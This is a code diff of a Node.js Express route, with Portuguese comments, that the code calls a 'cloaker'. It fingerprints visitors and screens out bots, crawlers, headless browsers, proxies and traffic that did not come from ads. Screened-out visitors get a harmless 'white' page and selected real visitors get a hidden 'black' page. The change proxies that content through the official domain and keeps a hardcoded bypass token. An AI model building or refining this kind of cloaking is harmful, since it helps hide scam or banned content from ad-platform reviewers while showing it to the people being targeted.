@@ -1,5 +1,6 @@
 const express = require('express');
 const router = express.Router();
+const axios = require('axios');
 const Fingerprint = require('../models/Fingerprint');
 const {
   isGeoAllowed,
@@ -9,20 +10,18 @@ const {
 } = require('../utils/securityChecks');
 const Domain = require('../models/Domain');
 
-
 // Página pública /:slug
 router.get('/:slug', async (req, res) => {
   try {
     const { slug } = req.params;
     const domain = await Domain.findOne({ slug });
-    if (!domain) return res.redirect('https://google.com'); // fallback se slug inválido
+    if (!domain) return res.status(404).send('Página não encontrada');
 
     const userAgent = req.headers['user-agent'] || '';
     const ref = req.get('referer') || '';
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     const { fp, token } = req.query;
 
-    // 🔍 Checagens básicas
     const isBot = /(bot|crawl|spider|facebookexternalhit|facebot|googlebot|bingbot)/i.test(userAgent);
     const fromAd = /(google|facebook|tiktok|kwai|bing|ads|utm)/i.test(ref);
     const headless = isHeadless(userAgent);
@@ -30,31 +29,39 @@ router.get('/:slug', async (req, res) => {
     const geoOk = await isGeoAllowed(ip);
     const timeOk = isAccessTimeValid();
 
-    // 🔐 Busca FP no Mongo
     const exists = await Fingerprint.findOne({ fp, ip, userAgent });
     const trusted = exists || (token === 'chave-compartilhamento-segura');
 
-    // 🚫 Bloqueio
     const blocked = isBot || !fromAd || headless || proxy || !geoOk || !timeOk;
-    
-    if (blocked && !trusted) {
-      console.warn("🚫 Visitante bloqueado:", { ip, ua: userAgent, ref });
-       return res.redirect(domain.baseUrl);
-    }
 
-    // ✅ Se for humano válido → salvar/atualizar FP
-    if (!exists && fp) {
+    // Determina a URL a ser carregada via proxy
+    const targetUrl = (blocked && !trusted)
+      ? domain.baseUrl   // Carrega a página white dentro do .com
+      : domain.realUrl;  // Carrega a página black dentro do .com
+
+    // Salva FP se for humano
+    if (!exists && fp && !blocked) {
       await Fingerprint.create({ fp, ip, userAgent, validado: true, dataValidado: new Date() });
-    } else if (exists && !exists.validado) {
+    } else if (exists && !exists.validado && !blocked) {
       exists.validado = true;
       exists.dataValidado = new Date();
       await exists.save();
     }
 
-   return res.redirect(domain.realUrl); // Página real liberada
+    // Faz o proxy do conteúdo da página
+    const response = await axios.get(targetUrl, {
+      headers: {
+        'User-Agent': userAgent,
+        'X-Forwarded-For': ip,
+        'Referer': ref
+      }
+    });
+
+    res.send(response.data); // INJETA o HTML direto no domínio oficial
+
   } catch (err) {
     console.error("❌ Erro em render.routes:", err.message);
-    return res.redirect(domain?.baseUrl);
+    return res.status(500).send('Erro interno no cloaker');
   }
 });
 
